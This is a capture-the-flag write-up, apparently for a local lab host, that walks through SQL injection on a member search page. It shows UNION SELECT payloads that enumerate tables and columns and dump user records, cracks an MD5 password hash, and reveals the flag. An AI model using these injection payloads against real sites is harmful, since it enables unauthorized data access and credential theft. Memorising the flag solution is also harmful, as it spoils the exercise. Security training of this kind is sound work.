First flag!


Step 1.) Where to find
http://192.168.1.100/index.php?page=member



Step 2.) Enter 1 or 1 = 1 inside search bar to test for basic sql injection

Step 3.)  Try to get the name of the table 
--> Insert the following into the search bar to see the name of the table
''
1=1  UNION SELECT  table_name, 1 FROM information_schema.tables where table_schema = database() 
''
after running that you find that the table name is 'users'



Step 4: Get column names 
''
1=1  UNION SELECT  column_name, 1 FROM information_schema.columns where table_schema = database() 
''

Step 5.) Getting the users on the site based on the information we have just gotten
''  
    1=1 UNION SELECT null, concat (user_id,first_name,last_name,town,country ,planet,commentaire,countersign) from users 
''


Then we get the following in our results

ID: 1=1 union select null, concat (user_id, first_name, last_name, town, country, planet, commentaire, countersign) from users 
First name: 
Surname : 5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28


Step 6.) So from the surname property we see to decode the password using MD5 then lowercasing the password 

MD5 decrpyt result = FortyTwo
lowercased = fortytwo

After running sha 256 calculator on the lowercased result = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

Well done we found the first flag!
